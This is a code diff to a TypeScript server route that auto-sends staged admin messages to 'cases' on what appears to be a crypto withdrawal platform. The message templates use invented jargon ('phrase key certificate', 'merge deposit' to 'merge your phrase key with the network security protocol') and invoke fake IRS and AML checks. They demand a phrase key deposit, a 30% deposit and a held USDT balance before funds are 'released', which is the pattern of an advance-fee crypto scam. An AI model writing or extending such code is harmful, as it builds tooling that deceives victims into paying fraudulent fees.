@@ -147,20 +147,75 @@ export async function registerRoutes(
         return;
       }
       
-      // Auto-send secure message when stage reaches 3 (Phrase Key Approved) and certificate not yet sent
-      if (data.withdrawalStage === '3' && previousStage !== '3' && !updated.phraseKeyCertificateSent) {
-        try {
-          await storage.createAdminMessage({
-            caseId: req.params.id,
+      // Auto-send secure messages for key withdrawal stages
+      const newStage = data.withdrawalStage;
+      if (newStage && previousStage !== newStage) {
+        const stageMessages: Record<string, { category: 'urgent' | 'processing' | 'resolved'; title: string; body: string }> = {
+          '1': {
+            category: 'processing',
+            title: 'Phrase Key Deposit Received',
+            body: 'Your phrase key deposit has been successfully received and confirmed on the blockchain ledger. Your account is now queued for phrase key generation. Please allow 24-48 hours for the secure encryption process to complete.'
+          },
+          '3': {
             category: 'resolved',
             title: 'Phrase Key Certificate Approved',
-            body: `Your Phrase Key has been successfully verified and approved. Your unique encryption certificate has been generated and is now active for withdrawal processing. This certificate is required for all future withdrawal transactions and ensures the security of your funds. Please proceed to the next verification stage.`,
-            isRead: false
-          });
-          // Mark certificate as sent
-          await storage.updateCase(req.params.id, { phraseKeyCertificateSent: true });
-        } catch (msgError) {
-          console.error('Failed to send phrase key certificate message:', msgError);
+            body: 'Your Phrase Key has been successfully verified and approved. Your unique encryption certificate has been generated and is now active for withdrawal processing. This certificate is required for all future withdrawal transactions and ensures the security of your funds. Please proceed to the next verification stage.'
+          },
+          '4': {
+            category: 'processing',
+            title: 'Withdrawal Process Initiated',
+            body: 'Your withdrawal request has been officially initiated. Our compliance team is now processing your request through our secure verification protocols. You will receive updates at each stage of the process.'
+          },
+          '7': {
+            category: 'urgent',
+            title: 'Phrase Key Merge Deposit Required',
+            body: 'A 30% merge deposit is required to complete the phrase key verification process. This deposit is necessary to merge your phrase key with the network security protocol. Please deposit the required amount to proceed with your withdrawal.'
+          },
+          '8': {
+            category: 'processing',
+            title: 'Financial Department Verification',
+            body: 'Your withdrawal request has advanced to the Financial Department for compliance verification. Our team is conducting thorough checks to ensure regulatory compliance and fund security.'
+          },
+          '10': {
+            category: 'urgent',
+            title: 'Blockchain Activity Verification Required',
+            body: 'Blockchain activity verification is now required. Please ensure your receiving wallet maintains the required USDT balance for verification purposes. This step confirms wallet ownership and activity status.'
+          },
+          '11': {
+            category: 'processing',
+            title: 'IRS / International AML Verification',
+            body: 'Your withdrawal is undergoing international anti-money laundering (AML) verification and IRS compliance checks. This is a standard regulatory requirement for large fund transfers.'
+          },
+          '13': {
+            category: 'resolved',
+            title: 'Withdrawal Successfully Released',
+            body: 'Congratulations! Your withdrawal has been successfully processed and released to your designated wallet address. Funds should arrive within 24-72 hours depending on network congestion. Thank you for your patience throughout this process.'
+          }
+        };
+
+        const stageMessage = stageMessages[newStage];
+        if (stageMessage) {
+          // Skip stage 3 message if certificate was already sent (prevent duplicates)
+          if (newStage === '3' && currentCase?.phraseKeyCertificateSent) {
+            // Certificate already sent, skip duplicate message
+          } else {
+            try {
+              await storage.createAdminMessage({
+                caseId: req.params.id,
+                category: stageMessage.category,
+                title: stageMessage.title,
+                body: stageMessage.body,
+                isRead: false
+              });
+              
+              // Mark certificate as sent for stage 3
+              if (newStage === '3') {
+                await storage.updateCase(req.params.id, { phraseKeyCertificateSent: true });
+              }
+            } catch (msgError) {
+              console.error('Failed to send stage message:', msgError);
+            }
+          }
         }
       }
       
